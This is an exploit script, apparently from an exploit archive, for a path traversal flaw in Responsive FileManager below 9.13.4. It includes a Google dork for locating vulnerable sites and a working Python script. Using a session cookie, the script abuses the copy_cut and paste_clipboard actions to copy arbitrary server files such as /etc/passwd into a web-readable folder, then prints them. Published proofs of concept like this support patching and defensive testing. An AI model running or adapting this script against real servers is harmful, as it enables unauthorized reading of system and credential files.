# Exploit Title: Responsive FileManager 9.13.4 - 'path' Path Traversal
# Date: 12/12/2018 (PoC)
# Date: 04/01/2020 (Auto Exploit)
# Exploit Author: SunCSR (Sun* Cyber Security Research)
# Google Dork: intitle:"Responsive FileManager 9.x.x"
# Vendor Homepage: http://responsivefilemanager.com/
# Software Link: https://github.com/trippo/ResponsiveFilemanager/releases/tag/v9.13.4
# Version: < 9.13.4
# Tested on: Linux 64bit + Python3

#!/usr/bin/python3

# Usage: python exploit.py [URL] [SESSION] [File Path]
# python3 exploit.py http://local.lc:8081 PHPSESSID=hfpg2g4rdpvmpgth33jn643hq4 /etc/passwd

import requests
import sys

def usage():
	if len(sys.argv) != 4:
		print("Usage: python3 exploit.py [URL]")
		sys.exit(0)

def copy_cut(url, session_cookie, file_name):
    headers = {'Cookie': session_cookie,'Content-Type': 'application/x-www-form-urlencoded'}
    url_copy = "%s/filemanager/ajax_calls.php?action=copy_cut" % (url)
    r = requests.post(
    url_copy, data="sub_action=copy&path=../../../../../../.."+file_name,headers=headers)
    return r.status_code

def paste_clipboard(url, session_cookie):
    headers = {'Cookie': session_cookie,'Content-Type': 'application/x-www-form-urlencoded'}
    url_paste = "%s/filemanager/execute.php?action=paste_clipboard" % (url)
    r = requests.post(
    url_paste, data="path=", headers=headers)
    return r.status_code

def read_file(url, file_name):
    name_file = file_name.split('/')[-1]
    url_path = "%s/source/%s" % (url,name_file) #This is the default directory,
    #if the website is a little different, edit this place
    result = requests.get(url_path)
    return result.text

def main():
    usage()
    url = sys.argv[1]
    session_cookie = sys.argv[2]
    file_name = sys.argv[3]
    print("[*] Copy Clipboard")
    copy_result = copy_cut(url, session_cookie, file_name)
    if copy_result==200:
    	paste_result = paste_clipboard(url, session_cookie)
    else:
    	print("[-] Paste False")
    if paste_result==200:
    	print("[*] Paste Clipboard")
    	print(read_file(url, file_name))
    else:
    	print("[-] Copy False")

if __name__ == "__main__":
   main()